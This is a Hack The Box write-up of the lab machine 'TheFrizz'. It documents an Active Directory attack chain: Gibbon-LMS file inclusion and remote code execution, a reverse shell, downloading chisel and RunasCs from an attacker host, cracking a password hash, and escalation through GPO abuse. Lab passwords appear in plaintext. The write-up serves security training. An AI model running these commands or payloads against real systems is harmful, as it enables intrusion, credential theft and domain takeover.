@@ -1,0 +1,230 @@
+Title: TheFrizz
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+TheFrizz was a Windows Active Directory box built around a public-facing Gibbon-LMS installation running on the domain controller itself. Enumerating the LMS surfaced its version and, from there, two separate public CVEs: an authenticated local file inclusion used to pull the application's own source and database dump, and a more obscure authenticated RCE that gave code execution as the web service account. Loot from the webroot handed over database credentials, which were tunneled to the internally-bound MySQL instance to dump and crack a staff password hash. That got a low-privilege domain shell and the user flag, but the real prize was found by decoding a base64-obfuscated scheduled task and digging through the Recycle Bin for an accidentally-undeleted WAPT server package, which leaked a second user's password. BloodHound then showed that second user held `WriteGPLink` over an OU containing a domain admin, and abusing that with SharpGPOAbuse to grant local admin rights led to a full administrative shell.
+
+## Recon
+
+```
+> nmap -T4 -p- --min-rate 2000 10.10.11.60
+PORT      STATE SERVICE
+22/tcp    open  ssh
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+49664/tcp open  unknown
+49668/tcp open  unknown
+49670/tcp open  unknown
+52144/tcp open  unknown
+52148/tcp open  unknown
+52157/tcp open  unknown
+
+> nmap -sC -sV -p22,53,80,88,135,139,389,445,464,593,636,3268,3269,49664,49668,49670,52144,52148,52157 10.10.11.60
+PORT      STATE SERVICE       VERSION
+22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
+|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
+|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-27 21:05:28Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+49664/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+52144/tcp open  msrpc         Microsoft Windows RPC
+52148/tcp open  msrpc         Microsoft Windows RPC
+52157/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 7h00m00s
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+```
+
+The port spread confirmed a Windows domain controller for `frizz.htb`, hostname `FRIZZDC`. `frizzdc.frizz.htb` and `frizz.htb` were added to `/etc/hosts`, and the web server redirected to a Gibbon-LMS staff login portal identified as Gibbon v25.0.00. `enum4linux -a` returned nothing useful against SMB, so enumeration continued against the web application.
+
+## Web Enumeration - Gibbon-LMS
+
+```
+> nikto -h frizzdc.frizz.htb
+> feroxbuster -u http://frizzdc.frizz.htb/ -w /usr/share/dirb/wordlists/common.txt
+```
+
+Directory brute-forcing mapped out the static `/home/` marketing site alongside the actual `Gibbon-LMS` application. Probing the login and password-reset flows leaked verbose, numbered error codes for both `passwordReset.php` and the login handler (e.g. `loginReturn=fail1` through `fail12+`), which was useful for later distinguishing valid usernames from invalid ones, but a password-spray attempt against discovered accounts quickly triggered Gibbon's lockout protection ("Too many failed logins: please reset password") and had to be abandoned. A known staff email, `f.frizzle@frizz.htb`, was identified from the site content for later use.
+
+Searching for the specific Gibbon version surfaced a known authenticated exploit (`https://www.exploit-db.com/exploits/51903`), and further searching turned up two applicable public CVEs.
+
+## Local File Inclusion - CVE-2023-34598
+
+The first CVE, an authenticated LFI in Gibbon-LMS (`https://github.com/maddsec/CVE-2023-34598`), allowed pulling arbitrary files from the server through the application's `q` parameter:
+
+```
+http://frizzdc.frizz.htb/Gibbon-LMS/?q=gibbon.sql
+http://frizzdc.frizz.htb/Gibbon-LMS/?q=./vendor/composer/installed.json
+```
+
+The first request dumped the application's full database schema and seed data as a large SQL file, and the second pulled Composer's dependency manifest, both saved locally and reviewed for anything sensitive (the JSON file was easier to work with pasted into an online formatter).
+
+## Remote Code Execution - CVE-2023-45878
+
+A second, less commonly indexed CVE (`https://github.com/davidzzo23/CVE-2023-45878`) provided authenticated remote code execution against the same Gibbon install. Running the public exploit script confirmed command execution as the web service account:
+
+```
+> python test.py -t frizzdc.frizz.htb -c "whoami"
+[+] Command output:
+frizz\w.webservice
+```
+
+A full reverse shell was then caught by pointing the same script at a listener:
+
+```
+> nc -nlvp 443
+> python3 test.py -t frizzdc.frizz.htb -s -i 10.10.14.179 -p 443
+```
+
+## Post-Exploitation Loot - Database Credentials
+
+No user flag was reachable directly as `w.webservice`, but the application's own `config.php` sitting in the working directory disclosed database credentials:
+
+```
+$databaseUsername = 'MrGibbonsDB';
+$databasePassword = 'MisterGibbs!Parrot!?1';
+```
+
+Running `winPEAS` from a writable temp directory turned up nothing further useful in the Apache access log, but did enumerate the machine's currently logged-in users: `w.Webservice`, `v.frizzle` (an Administrator-group account, "Valerie Frizzle"), and `M.SchoolBus` (a standard user with Remote Management rights). A full `net user` listing confirmed the rest of the domain's user accounts.
+
+## Pivoting to MySQL and Cracking f.frizzle
+
+A `netstat` check showed MySQL (port 3306) bound to localhost only. `chisel` was uploaded and used to tunnel that port out to the attacking host:
+
+```
+> iwr -uri 10.10.14.179:7575/chisel.exe -outfile chisel.exe
+> chisel server --reverse --port 9002
+> .\chisel.exe client 10.10.14.179:9002 R:3306:127.0.0.1:3306
+```
+
+With the tunnel up, the leaked `MrGibbonsDB` credentials were used to connect directly and pull password hashes from the `gibbon` database:
+
+```
+> mysql -h 127.0.0.1 -u MrGibbonsDB -p --skip-ssl=true
+> USE gibbon;
+> SELECT username,passwordStrong,passwordStrongSalt FROM gibbonperson;
++-----------+------------------------------------------------------------------+------------------------+
+| username  | passwordStrong                                                   | passwordStrongSalt     |
++-----------+------------------------------------------------------------------+------------------------+
+| f.frizzle | 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03 | /aACFhikmNopqrRTVz2489 |
++-----------+------------------------------------------------------------------+------------------------+
+```
+
+The hash-plus-salt pair was cracked with hashcat using the salted-SHA mode:
+
+```
+> hashcat -m 1420 -a 0 hash.txt rockyou.txt
+```
+
+recovering `f.frizzle:Jenni_Luvs_Magic23`.
+
+## Foothold - User Flag as f.frizzle
+
+Direct WinRM and password SSH both failed for `f.frizzle`, but authenticating over Kerberos succeeded, giving an interactive shell and the user flag:
+
+```
+> ssh f.frizzle@10.10.11.60
+f.frizzle@10.10.11.60: Permission denied (gssapi-with-mic,keyboard-interactive).
+> evil-winrm -i 10.10.11.60 -P 22 -u f.frizzle -p 'Jenni_Luvs_Magic23'
+[fails]
+> ../../mine/krbSSH.sh frizzdc.frizz.htb 10.10.11.60 f.frizzle
+```
+
+## Decoding a Scheduled Task and Recycle Bin Recovery
+
+`winPEAS` flagged `LocalAccountTokenFilterPolicy` set to 1 (allowing any local account to be used for lateral movement) and a non-Microsoft scheduled task, `Frizz-Cleanup`, running as `frizz\administrator` at startup and every five minutes, with its command base64-encoded. Decoding it revealed a PowerShell script that wrote the user flag to disk and then checked whether the Recycle Bin was empty; if so, it attempted to delete a file, `MyMiles_Beta.zip`, from `f.frizzle`'s Temp directory. That file wasn't present in Temp, which pointed toward the Recycle Bin itself as the more interesting location to check:
+
+```
+> cd 'C:\$Recycle.Bin'
+> ls -hidden
+> cd S-1-5-21-2386970044-1145388522-2932701813-1103
+```
+
+Two archive fragments sitting in the bin, `$IE2XMEG.7z` and `$RE2XMEG.7z`, were pulled back over an authenticated SCP session:
+
+```
+> export KRB5CCNAME="$(pwd)/f.frizzle.ccache"
+> scp f.frizzle@10.10.11.60:'C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$IE2XMEG.7z' .
+> scp f.frizzle@10.10.11.60:'C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' .
+```
+
+The archives extracted to a WAPT (Windows Automated Packaging Tool) server install. The database itself held nothing useful, but grepping the configuration directory for `password` found a base64-encoded credential in the server's own ini file:
+
+```
+./conf/waptserver.ini:wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
+> echo "IXN1QmNpZ0BNZWhUZWQhUgo=" | base64 -d
+!suBcig@MehTed!R
+```
+
+Since `M.SchoolBus` had already been noted as a currently logged-in user on the box, this credential was tried against that account and worked:
+
+```
+M.SchoolBus:!suBcig@MehTed!R
+> ../../mine/krbSSH.sh frizzdc.frizz.htb 10.10.11.60 M.SchoolBus
+```
+
+## Privilege Escalation - GPO Abuse to Domain Admin
+
+`winPEAS` found nothing further useful under `M.SchoolBus`, so BloodHound was run to map the account's effective rights:
+
+```
+> bloodhound-python -u M.SchoolBus -p '!suBcig@MehTed!R' -d frizz.htb -ns 10.10.11.60 -c All --zip
+```
+
+Path-finding from `M.SchoolBus` to Domain Admins showed one route: `M.SchoolBus` held `WriteGPLink` on an OU (`Class_fritz`) containing `v.frizzle`, the admin-group user seen earlier. That right allows linking an attacker-controlled GPO to the OU, which SharpGPOAbuse can use to push a malicious local-admin-group modification down to every computer object under it. A prebuilt `SharpGPOAbuse.exe` was fetched to avoid compiling from source:
+
+```
+> New-GPO -Name "test" -Comment "For SharpGPOAbuse testing"
+> New-GPLink -Name "test" -Target "OU=Domain Controllers,DC=frizz,DC=htb"
+> .\sharp.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName "test"
+> gpupdate /force
+```
+
+After a forced policy refresh, `M.SchoolBus` was confirmed to be a local administrator on the domain controller. `Invoke-RunasCs` was then used to spawn a privileged reverse shell using the same credentials:
+
+```
+> iwr -uri 10.10.14.179:7575/Invoke-RunasCs.ps1 -outfile test.ps1
+> Unblock-File -Path .\test.ps1
+> . .\test.ps1
+> Invoke-RunasCs "M.SchoolBus" '!suBcig@MehTed!R' powershell.exe -Remote 10.10.14.179:443
+```
+
+catching a full administrative shell on the DC. Note: applying the GPO change this way reliably broke SSH for `M.SchoolBus` shortly afterward, leaving only a narrow window (roughly ten minutes) to use the resulting access before needing a machine reset.
+
+## Takeaways
+
+- A public-facing LMS/CMS running with a discoverable version number is worth checking against CVE databases before anything else; Gibbon-LMS here had two separate authenticated CVEs, one much easier to find than the other.
+- Verbose password-reset and login error codes can be a useful side channel for username enumeration even when they don't directly leak credentials, though aggressive spraying against them can trip lockout protections quickly.
+- Source or config files pulled via an LFI, or left behind in a web service account's working directory after RCE, often contain database or service credentials that unlock further internal pivoting.
+- MySQL and other services bound only to loopback are not out of reach once code execution is established; a tool like chisel can tunnel them out for direct querying from the attacking machine.
+- Scheduled tasks and startup scripts are worth decoding even when they look like routine cleanup; a base64-obfuscated command that "just" deletes a temp file can reveal exactly where an operator's sensitive files actually ended up, in this case the Recycle Bin rather than Temp.
+- The Recycle Bin is frequently overlooked as a loot source; files "deleted" there are often still fully recoverable and can contain leftover application installers, configs, or credentials.
+- BloodHound-mapped `WriteGPLink` rights on an OU are a direct escalation path when combined with a GPO-abuse tool like SharpGPOAbuse, letting a low-privileged account push local admin rights onto any computer or effectively act through any user under that OU.
